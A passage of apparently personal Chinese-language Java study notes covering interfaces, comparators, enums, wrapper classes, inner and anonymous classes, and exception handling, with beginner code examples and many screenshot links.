src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220309012134974.png" alt="image-20220309012134974"></p><p>一个类实现接口后，如果不想实现接口中的抽象方法，则自己必须变为抽象类</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220309012443711.png" alt="image-20220309012443711"></p><hr><p>添加默认方法：</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220309012838207.png" alt="image-20220309012838207"></p><p>这个方法不是每个实现这个接口的类都必须要重写的，按需使用。比如飞机和小鸟，只有飞机需要加油，小鸟并不需要。</p><p>添加静态方法：</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220309013126800.png" alt="image-20220309013126800"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220309013720061.png" alt="image-20220309013720061"></p><p>接口也可以进行多继承：</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220309013858147.png" alt="image-20220309013858147"></p><p>一个类可以先继承一个父类，再去实现多个接口，顺序不能改变，必须先继承再改变</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220309014202863.png" alt="image-20220309014202863"></p><h2 id="接口的非正常情况"><a href="#接口的非正常情况" class="headerlink" title="接口的非正常情况"></a>接口的非正常情况</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220309015249961.png" alt="image-20220309015249961"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220309015303113.png" alt="image-20220309015303113"></p><p>这两个接口有重名的方法，当实现的时候就会报错</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220309015327271.png" alt="image-20220309015327271"></p><p>解决方法：在类中重写 study方法</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220309015415696.png" alt="image-20220309015415696"></p><p>但是，但我们想要调用接口的study方法该怎么办？</p><p>重写study后这样调用：</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220309015757108.png" alt="image-20220309015757108"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220309015510568.png" alt="image-20220309015510568"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220309015547202.png" alt="image-20220309015547202"></p><h2 id="comparable接口"><a href="#comparable接口" class="headerlink" title="comparable接口"></a>comparable接口</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220309020503383.png" alt="image-20220309020503383"></p><p>使用comparable接口完成引用数据类型的比较</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220309020938494.png" alt="image-20220309020938494"></p><p>需要实现：</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220309021013901.png" alt="image-20220309021013901"></p><p>重写Comparable</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220309021220640.png" alt="image-20220309021220640"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220309021248580.png" alt="image-20220309021248580"></p><h1 id="day12-面向对象"><a href="#day12-面向对象" class="headerlink" title="day12 面向对象"></a>day12 面向对象</h1><h2 id="comparable接口-内部比较器"><a href="#comparable接口-内部比较器" class="headerlink" title="comparable接口-内部比较器"></a>comparable接口-内部比较器</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220317222648883.png" alt="image-20220317222648883"></p><pre><code class="java">package com.sakura.neibu;public class Test &#123;    public static void main(String[] args) &#123;    Person p1 = new Person(&quot;李白&quot;,40);    Person p2 = new Person(&quot;杜甫&quot;,30);    int i = p1.compareTo(p2);    if(i&gt;0)&#123;        System.out.println(p1.name+&quot;&gt;&quot;+p2.name);    &#125;else if(i&lt;0)&#123;            System.out.println(p1.name+&quot;&lt;&quot;+p2.name);        &#125;else &#123;        System.out.println(p1.name+&quot;=&quot;+p2.name);    &#125;    &#125;&#125;class Person implements Comparable&#123;    @Override    public int compareTo(Object o) &#123;        Person p = (Person)o;        return this.age-p.age;    &#125;    String name;    int age;    public Person(String name, int age) &#123;        this.name = name;        this.age = age;    &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220321223505628.png" alt="image-20220321223505628"></p><h2 id="Comparator接口-外部比较器"><a href="#Comparator接口-外部比较器" class="headerlink" title="Comparator接口-外部比较器"></a>Comparator接口-外部比较器</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220322223441069.png" alt="image-20220322223441069"></p><p>代码范例:</p><p>Person.java</p><pre><code class="java">package com.sakura.waibu;public class Person &#123;    String name;    int age;    double salary;    public Person(String name, int age, double salary) &#123;        this.name = name;        this.age = age;        this.salary = salary;    &#125;    public Person() &#123;    &#125;    public void setName(String name) &#123;        this.name = name;    &#125;    public void setAge(int age) &#123;        this.age = age;    &#125;    public void setSalary(double salary) &#123;        this.salary = salary;    &#125;&#125;</code></pre><p>PerSortOfAge.java</p><pre><code class="java">package com.sakura.waibu;import java.util.Comparator;public class PersonSortOfAge implements Comparator &#123;    @Override    public int compare(Object o1, Object o2) &#123;        Person p1 = (Person)o1;        Person p2 = (Person)o2;        return p1.age-p2.age;    &#125;&#125;</code></pre><p>Test.java</p><pre><code class="java">package com.sakura.waibu;public class Test &#123;    public static void main(String[] args) &#123;        Person p1 = new Person(&quot;李白&quot;,60,6666.55);        Person p2 = new Person(&quot;杜甫&quot;,58,8888);        PersonSortOfAge sortOfAge = new PersonSortOfAge();        int res = sortOfAge.compare(p1,p2);        if(res &gt; 0)&#123;            System.out.println(p1.name+&quot;&gt;&quot;+p2.name);        &#125;else if(res &lt; 0)&#123;            System.out.println(p2.name+&quot;&lt;&quot;+p1.name);        &#125;else &#123;            System.out.println(p1.name+&quot;=&quot;+p2.name);        &#125;    &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220322225423524.png" alt="image-20220322225423524"></p><h2 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h2><h3 id="枚举初识"><a href="#枚举初识" class="headerlink" title="枚举初识"></a>枚举初识</h3><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220322232627649.png" alt="image-20220322232627649"></p><p>示例代码:</p><p>Season.java</p><pre><code class="java">package com.sakura.enum2;public enum Season &#123;    SPRING(&quot;春暖花开&quot;,&quot;春天&quot;),    SUMMER(&quot;夏日炎炎&quot;,&quot;夏天&quot;),    AUTUMN(&quot;秋高气爽&quot;,&quot;秋天&quot;),    WINTER(&quot;白雪恺恺&quot;,&quot;冬天&quot;);    private String des;    private String name;    Season(String des, String name) &#123;        this.des = des;        this.name = name;    &#125;    Season() &#123;    &#125;    @Override    public String toString() &#123;        return &quot;Season&#123;&quot; +                &quot;des=&#39;&quot; + des + &#39;\&#39;&#39; +                &quot;, name=&#39;&quot; + name + &#39;\&#39;&#39; +                &#39;&#125;&#39;;    &#125;&#125;</code></pre><p>test.java</p><pre><code class="java">package com.sakura.enum2;public class test &#123;    String name = &quot;word&quot;;    int num = 200;    Season season = Season.SPRING;    public static void main(String[] args) &#123;        test one =new test();        System.out.println(&quot;one.name = &quot; + one.name);        System.out.println(&quot;one.season = &quot; + one.season.name());        System.out.println(&quot;one.num = &quot; + one.num);    &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220714155112254.png" alt="image-20220714155112254"></p><h3 id="枚举结束"><a href="#枚举结束" class="headerlink" title="枚举结束"></a>枚举结束</h3><p>使用switch语句来判断是哪个枚举:</p><p>TestSwitch.java</p><pre><code class="java">package com.sakura.enum2;public class TestSwitch &#123;    public static void main(String[] args) &#123;        Season season = Season.SPRING;        switch (season)&#123;            case SPRING:                System.out.println(&quot;温暖&quot;);                break;            case SUMMER:                System.out.println(&quot;炎热&quot;);            case AUTUMN:                System.out.println(&quot;舒适&quot;);                break;            case WINTER:                System.out.println(&quot;寒冷&quot;);                break;        &#125;    &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220714160849714.png" alt="image-20220714160849714"></p><h3 id="枚举实现接口"><a href="#枚举实现接口" class="headerlink" title="枚举实现接口"></a>枚举实现接口</h3><p>Gender.java</p><pre><code class="java">package com.sakura.enum3;public enum Gender implements Run&#123;    MAN&#123;        @Override        public void run() &#123;            System.out.println(&quot;男士 大步走&quot;);        &#125;    &#125;,WOMAN&#123;        @Override        public void run() &#123;            System.out.println(&quot;女士 不紧不慢的走&quot;);        &#125;    &#125;;&#125;interface Run&#123;    void run();&#125;</code></pre><p>Test.java</p><pre><code class="java">package com.sakura.enum3;public class Test &#123;    public static void main(String[] args) &#123;        Gender people = Gender.MAN;        people.run();    &#125;&#125;</code></pre><h3 id="练习-1"><a href="#练习-1" class="headerlink" title="练习"></a>练习</h3><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220714222230916.png" alt="image-20220714222230916"></p><p>示例代码:</p><p>Month.java</p><pre><code class="java">package com.sakura.enum4;public enum Month &#123;    JANUARY(1,&quot;这是一月&quot;),    FEBRUARY(2,&quot;这是二月&quot;),    March(3,&quot;这是三月&quot;),    APRIL(4,&quot;这是四月&quot;),    MAY(5,&quot;这是五月&quot;),    JUNE(6,&quot;这是六月&quot;),    JULY(7,&quot;这是七月&quot;),    AUGUST(8,&quot;这是八月&quot;),    SEPTEMBER(9,&quot;这是九月&quot;),    OCTOBER(10,&quot;这是十月&quot;),    NOVEMBER(11,&quot;这是十一月&quot;),    DECEMBER(12,&quot;这是十二月&quot;);    private int value;    private String des;    Month(int value, String des) &#123;        this.value = value;        this.des = des;    &#125;    Month() &#123;    &#125;    @Override    public String toString() &#123;        return &quot;Month&#123;&quot; +                &quot;value=&quot; + value +                &quot;, des=&#39;&quot; + des + &#39;\&#39;&#39; +                &#39;&#125;&#39;;    &#125;&#125;</code></pre><p>Test.java</p><pre><code class="java">package com.sakura.enum4;import java.util.Scanner;public class Test &#123;    public static void main(String[] args) &#123;        System.out.println(&quot;请输入您要获取月份所对应的数字:&quot;);        Scanner input = new Scanner(System.in);        int num = input.nextInt();        getByValue(num);    &#125;    public static Month getByValue(int value)&#123;        switch (value)&#123;            case 1:                System.out.println(Month.JANUARY);                break;            case 2:                System.out.println(Month.FEBRUARY);                break;            case 3:                System.out.println(Month.March);                break;            case 4:                System.out.println(Month.APRIL);                break;            case 5:                System.out.println(Month.MAY);                break;            case 6:                System.out.println(Month.JUNE);                break;            case 7:                System.out.println(Month.JULY);                break;            case 8:                System.out.println(Month.AUGUST);                break;            case 9:                System.out.println(Month.SEPTEMBER);                break;            case 10:                System.out.println(Month.OCTOBER);                break;            case 11:                System.out.println(Month.NOVEMBER);                break;            case 12:                System.out.println(Month.DECEMBER);                break;        &#125;        return Month.JANUARY; # 这个地方的return只是为了避免报错，无特殊含义    &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220714223902463.png" alt="image-20220714223902463"></p><h2 id="包装类初识"><a href="#包装类初识" class="headerlink" title="包装类初识"></a>包装类初识</h2><p>Java提供了两个类型系统，基本类型与引用类型，使用基本类型在于效率，然而当要使用只针对对象设计的API或新特性（例如泛型)，那么基本数据类型的数据就需要用包装类来包装。</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220714223558341.png" alt="image-20220714223558341"></p><p>比如Integer有很多方法</p><p>test.java</p><pre><code class="java">package com.sakura.wrapper;public class test &#123;    public static void main(String[] args) &#123;        int a = 100;        System.out.println(Integer.MAX_VALUE);        System.out.println(Integer.MIN_VALUE);        String s1 = Integer.toBinaryString(a);        String s2 =Integer.toHexString(a);        System.out.println(&quot;s1 = &quot; + s1);        System.out.println(&quot;s2 = &quot; + s2);    &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220714225729157.png" alt="image-20220714225729157"></p><h2 id="自动装箱和自动拆箱"><a href="#自动装箱和自动拆箱" class="headerlink" title="自动装箱和自动拆箱"></a>自动装箱和自动拆箱</h2><p>基本数据类型转化为包装类型数据:</p><p><strong>老方法</strong>:</p><p>方式一:通过构造器</p><pre><code class="java">Integer 标识符 = new Integer(基本数据类型);如: int a = 10;Integer i1 = new Integer(a);</code></pre><p>方法二</p><pre><code class="java">Integer 标识符 = Integer.valueOf(基本数据类型);如:int a = 10;Integer i2 = Integer.valueOf(a);</code></pre><p><strong>新方法</strong>:</p><p>自动装箱</p><pre><code class="java">Integer in = 基本数据类型;自动装箱底层采用的是 IntegerOf.valueOf(a);</code></pre><p>包装类型数据转化为基本类型数据:</p><pre><code class="java">Integer i4 = new Integer(20);</code></pre><p>方法一:调用包装类对象的 intValue();</p><pre><code class="java">int i = i4.intValue();</code></pre><p>方法二:自动拆箱</p><p>自动将引用数据类型变为基本数据类型</p><pre><code class="java">int i =i4;</code></pre><h2 id="基本类型与包装类型与字符串之间的转换"><a href="#基本类型与包装类型与字符串之间的转换" class="headerlink" title="基本类型与包装类型与字符串之间的转换"></a>基本类型与包装类型与字符串之间的转换</h2><p>1、字符串—&gt;基本数据类型</p><p>Integer.parseInt(“字符串纯数字”); 如果不是纯数字，会报异常,NumberFormatException</p><p>示例代码:</p><p>test.java</p><pre><code class="java">package com.sakura.wrapper2;import java.util.Scanner;public class test &#123;    public static void main(String[] args) &#123;        Scanner input = new Scanner(System.in);        System.out.println(&quot;请输入一个数字:&quot;);        String a = input.next();        int b = Integer.parseInt(a);        System.out.println(&quot;b = &quot; + b);    &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220715152344679.png" alt="image-20220715152344679"></p><p>方法二:</p><pre><code>Integer i = new Integer(&quot;字符串纯数字&quot;);</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220715152746653.png" alt="image-20220715152746653"></p><p>注意char中没有此类方法:</p><pre><code class="java">&quot;AB&quot;.charAt(1); 0代表第一个字符，1代表第二个字符</code></pre><p>2、基本类型数据转为字符串</p><p>方法一:</p><pre><code class="java">int a = 10;String ss = &quot;&quot;+a;</code></pre><p>方法二:</p><pre><code class="java">int b = 20;string i = String.valueOf(b);</code></pre><h2 id="对应包装类型的缓存区"><a href="#对应包装类型的缓存区" class="headerlink" title="对应包装类型的缓存区"></a>对应包装类型的缓存区</h2><p>包装类型数据，只能接受对应的包装类型，不能再采用类型自动提升</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220716155808087.png" alt="image-20220716155808087"></p><p>包装类型有一个缓存区，超过这个区域，就会去new一个包装类</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220716160816365.png" alt="image-20220716160816365"></p><p>示例代码:</p><pre><code class="java">public class test &#123;    public static void main(String[] args) &#123;        Integer a = 100;        Integer b = 100;        System.out.println(&quot;1-----&gt;&quot; + (a==b));        Integer c = 1000;        Integer d = 1000;        System.out.println(&quot;2------&gt;&quot;+(c==d));    &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220716161726283.png" alt="image-20220716161726283"></p><h2 id="静态内部类"><a href="#静态内部类" class="headerlink" title="静态内部类"></a>静态内部类</h2><p>什么是内部类?</p><p>将一个类A定义在另一个类B里面，里面的那个类A就称为内部类，B则称为外部类。</p><p> 作用:</p><p>1.可以打破java单继承的限制<br>2.在内部类中做更多的功能为外部类服务<br>3.可以资源的隐藏</p><p>特点:</p><p>静态内部类可以访问静态外部类资源</p><p>静态的属性，静态的方法</p><p>修饰：</p><p>外部类只能被public和public修饰，内部类无限制</p><p>语法结构：</p><pre><code class="java">class 外部类名&#123;    [权限修饰符四种] static [final] class 内部类名&#123;            &#125;&#125;</code></pre><h2 id="非静态内部类"><a href="#非静态内部类" class="headerlink" title="非静态内部类"></a>非静态内部类</h2><p>不加static修饰的内部类</p><pre><code class="java">class 外部类名&#123;    [权限修饰符四种] class 内部类名&#123;            &#125;&#125;</code></pre><p>特点：</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220901212139028.png" alt="image-20220901212139028"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220901212912590.png" alt="image-20220901212912590"></p><h1 id="day13"><a href="#day13" class="headerlink" title="day13"></a>day13</h1><h2 id="局部内部类"><a href="#局部内部类" class="headerlink" title="局部内部类"></a>局部内部类</h2><p>不是重点</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220902214930486.png" alt="image-20220902214930486"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220902222245029.png" alt="image-20220902222245029"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220902230731669.png" alt="image-20220902230731669"></p><h2 id="匿名内部类的声明"><a href="#匿名内部类的声明" class="headerlink" title="匿名内部类的声明"></a>匿名内部类的声明</h2><p>匿名内部类：没有名字的类</p><p>匿名对象：没有名字的对象</p><p>方式一：</p><pre><code class="java">new 父类()&#123;    重写父类方法&#125;创建了一个子类，但是子类没有名字</code></pre><p>方式二：</p><pre><code class="java">new 父类(实参列表)&#123;    重写父类方法&#125;创建了一个子类，但是子类没有名字</code></pre><p>方式三：</p><pre><code class="java">new 父接口()&#123;    重写父类方法&#125;创建了一个子类，但是子类没有名字</code></pre><p>方式四:</p><pre><code class="java">new 父抽象类()&#123;    重写父类方法&#125;创建了一个子类，但是子类没有名字</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220903003418869.png" alt="image-20220903003418869"></p><p>示例代码：</p><pre><code class="java">package com.sakura.innerclass.anosclass;import org.junit.Test;interface Run&#123;    void run();&#125;abstract class Animal&#123;    abstract void eat();&#125;public class TestLocal &#123;    @Test    public void test01()&#123;        new Father()&#123;            @Override            public void show() &#123;                System.out.println(&quot;this is new show-1()&quot;);            &#125;        &#125;;    &#125;    @Test    public void test02()&#123;        new Father(30)&#123;            @Override            public void show() &#123;                System.out.println(&quot;this is new show-2(30)&quot;);            &#125;        &#125;;    &#125;    @Test    public void test03()&#123;        new Run()&#123;            @Override            public void run() &#123;                System.out.println(&quot;this is new Run&quot;);            &#125;        &#125;;    &#125;    @Test    public void test04()&#123;        new Animal()&#123;            @Override            void eat() &#123;                System.out.println(&quot;this is new eat()&quot;);            &#125;        &#125;    &#125;&#125;class Father&#123;    int age;    String name;    public Father(int age)&#123;        this.age=age;    &#125;    public Father()&#123;    &#125;    public void show()&#123;        System.out.println(&quot;this is father show(&quot;);    &#125;&#125;</code></pre><h2 id="匿名内部类的使用"><a href="#匿名内部类的使用" class="headerlink" title="匿名内部类的使用"></a>匿名内部类的使用</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220903012609400.png" alt="image-20220903012609400"></p><pre><code class="java">package com.sakura.innerclass.anosclass;import org.junit.Test;interface Fly&#123;    void fly();&#125;public class TestLocal2 &#123;    @Test    public void test03()&#123;        method(new Fly()&#123;            @Override            public void fly() &#123;                System.out.println(&quot;超人会飞&quot;);            &#125;        &#125;);        &#125;    public static void method(Fly fly) &#123;        fly.fly();    &#125;    @Test    public void test01()&#123;        new Father()&#123;            @Override            public void show() &#123;                System.out.println(&quot;this is new Father show()&quot;);            &#125;        &#125;.show();    &#125;    @Test    public void test02()&#123;        Father father = new Father(99)&#123;            @Override            public void show() &#123;                System.out.println(&quot;this is new Father show-2()&quot;);            &#125;        &#125;;        father.show();        father.test();        System.out.println(father.num);    &#125;&#125;class Father&#123;    int num;    public Father(int num) &#123;        this.num = num;    &#125;    public Father() &#123;    &#125;    public void test()&#123;        System.out.println(&quot;this is Father test&quot;);    &#125;    public void show()&#123;        System.out.println(&quot;this is Father show()&quot;);    &#125;&#125;</code></pre><p>·<img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220903012819536.png" alt="image-20220903012819536"></p><h2 id="匿名内部类练习一"><a href="#匿名内部类练习一" class="headerlink" title="匿名内部类练习一"></a>匿名内部类练习一</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220903140738094.png" alt="image-20220903140738094"></p><p>Employee.java</p><pre><code class="java">package com.sakura.innerclass.eaer;public class Employee &#123;    private int num;    private String name;    private double salary;    public Employee(int num, String name, double salary) &#123;        this.num = num;        this.name = name;        this.salary = salary;    &#125;    public void setNum(int num) &#123;        this.num = num;    &#125;    public void setName(String name) &#123;        this.name = name;    &#125;    public void setSalary(double salary) &#123;        this.salary = salary;    &#125;    public int getNum() &#123;        return num;    &#125;    public String getName() &#123;        return name;    &#125;    public double getSalary() &#123;        return salary;    &#125;    @Override    public String toString() &#123;        return &quot;Employee&#123;&quot; +                &quot;num=&quot; + num +                &quot;, name=&#39;&quot; + name + &#39;\&#39;&#39; +                &quot;, salary=&quot; + salary +                &#39;&#125;&#39;;    &#125;    public Employee() &#123;    &#125;&#125;</code></pre><p>Test.java</p><pre><code class="java">package com.sakura.innerclass.eaer;import java.util.Arrays;import java.util.Comparator;public class Test &#123;    public static void main(String[] args) &#123;        Employee e1 = new Employee(1,&quot;李白&quot;,5489.21);        Employee e2 = new Employee(2,&quot;杜甫&quot;,6984.66);        Employee e3 = new Employee(3,&quot;白居易&quot;,8888.666);        Employee e4 = new Employee(4,&quot;苏轼&quot;,4569.44);        Employee e5 = new Employee(5,&quot;李清照&quot;,8999.99);        Employee[] employees = &#123;e1,e2,e3,e4,e5&#125;;//        SortEmployee sortEmployee = new SortEmployee();        System.out.println(&quot;排序前&quot;);        arrayprint(employees);        System.out.println(&quot;排序后&quot;);        Arrays.sort(employees, new Comparator() &#123;            @Override            public int compare(Object o1, Object o2) &#123;                Employee e1 = (Employee)o1;                Employee e2 = (Employee)o2;                return Double.compare(e1.getSalary(),e2.getSalary());            &#125;        &#125;);        arrayprint(employees);    &#125;    public static void arrayprint(Employee[] e)&#123;        for (Employee employee : e) &#123;            System.out.println(employee);        &#125;    &#125;&#125;</code></pre><p>这里使用了匿名内部类，要重点关注</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220903153227023.png" alt="image-20220903153227023"></p><p>运行结果：</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220903154308675.png" alt="image-20220903154308675"></p><h2 id="注解"><a href="#注解" class="headerlink" title="注解"></a>注解</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220903160756959.png" alt="image-20220903160756959"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220903161608984.png" alt="image-20220903161608984"></p><h2 id="项目-客户信息管理系统"><a href="#项目-客户信息管理系统" class="headerlink" title="项目:客户信息管理系统"></a>项目:客户信息管理系统</h2><h2 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220903162255657.png" alt="image-20220903162255657"></p><h2 id><a href="#" class="headerlink" title></a><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220903162314145.png" alt="image-20220903162314145"></h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220903162332627.png" alt="image-20220903162332627"></p><h2 id="开发简单架构"><a href="#开发简单架构" class="headerlink" title="开发简单架构"></a>开发简单架构</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220903162934336.png" alt="image-20220903162934336"></p><h1 id="day14"><a href="#day14" class="headerlink" title="day14"></a>day14</h1><h2 id="异常体系"><a href="#异常体系" class="headerlink" title="异常体系"></a>异常体系</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220906211332365.png" alt="image-20220906211332365"></p><h2 id="异常的演示"><a href="#异常的演示" class="headerlink" title="异常的演示"></a>异常的演示</h2><pre><code class="java">package com.sakura.exception;import org.junit.Test;public class test1 &#123;    @Test    public void arryException()&#123;        int[] arr = &#123;1,2,3&#125;;        try &#123;            System.out.println(arr[3]);        &#125;catch (ArrayIndexOutOfBoundsException e)&#123;            e.printStackTrace(); //打印异常信息            e.getMessage(); //获取异常位置            System.out.println(&quot;该行代码已执行！&quot;);        &#125;    &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220906220355874.png" alt="image-20220906220355874"></p><h2 id="使用try-catch处理异常"><a href="#使用try-catch处理异常" class="headerlink" title="使用try catch处理异常"></a>使用try catch处理异常</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220906224711456.png" alt="image-20220906224711456"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220906225236503.png" alt="image-20220906225236503"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220906225500468.png" alt="image-20220906225500468"></p><p>但是这种写起来比较麻烦，如果采用了多层catch，我们可以省略为一个Exception</p><pre><code class="java">try&#123;    &#125;catch(xxx)&#123;    &#125;catch(xxx)&#123;    &#125;catch(Exception e)&#123;&#125;</code></pre><h2 id="使用try-catch-finally处理异常"><a href="#使用try-catch-finally处理异常" class="headerlink" title="使用try catch finally处理异常"></a>使用try catch finally处理异常</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220906232454261.png" alt="image-20220906232454261"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220906234338231.png" alt="image-20220906234338231"></p><h2 id="使用throw和throws处理异常"><a href="#使用throw和throws处理异常" class="headerlink" title="使用throw和throws处理异常"></a>使用throw和throws处理异常</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220907002856303.png" alt="image-20220907002856303"></p><p>示例代码一:</p><pre><code class="java">package com.sakura.exception.throwexception;public class ThrowException2 &#123;    public static void main(String[] args) &#123;        try&#123;            showMessage(4);        &#125;catch (ArrayIndexOutOfBoundsException e)&#123;            System.err.println(e.getMessage());            System.out.println(&quot;这行也执行啦&quot;);        &#125;    &#125;    public static void showMessage(int index)&#123;        int [] arr = &#123;1,2,3&#125;;        if(index &lt;0 || index &gt;= arr.length)&#123;            throw new ArrayIndexOutOfBoundsException(&quot;数组下标越界了！&quot;);        &#125;        System.out.println(arr[index]);    &#125;&#125;</code></pre><p>此为运行时异常:</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220907010102445.png" alt="image-20220907010102445"></p><p>示例代码二:</p><pre><code class="java">package com.sakura.exception.throwexception;import java.io.File;import java.io.FileNotFoundException;public class ThrowException &#123;    public static void main(String[] args) &#123;        try &#123;            showMessage();        &#125; catch (FileNotFoundException e) &#123;            throw new RuntimeException(e);        &#125;    &#125;    public static void showMessage() throws FileNotFoundException&#123;        File file = new File(&quot;C:\\Users\\Sakura\\Desktop\\图片\\love.jpg&quot;);        boolean exists = file.exists();        if(!exists)&#123;            throw new FileNotFoundException(&quot;文件不存在o&quot;);        &#125;        System.out.println(exists);    &#125;&#125;</code></pre><p>这里是一个编译时异常，必须在方法名后throw异常</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220907004537390.png" alt="image-20220907004537390"></p><h2 id="异常类方法重写"><a href="#异常类方法重写" class="headerlink" title="异常类方法重写"></a>异常类方法重写</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220910224705836.png" alt="image-20220910224705836"></p><p>如，此时子类的异常比父类大就会报错，将异常换位置即可！</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220910225655631.png" alt="image-20220910225655631"></p><h2 id="自定义异常的方式"><a href="#自定义异常的方式" class="headerlink" 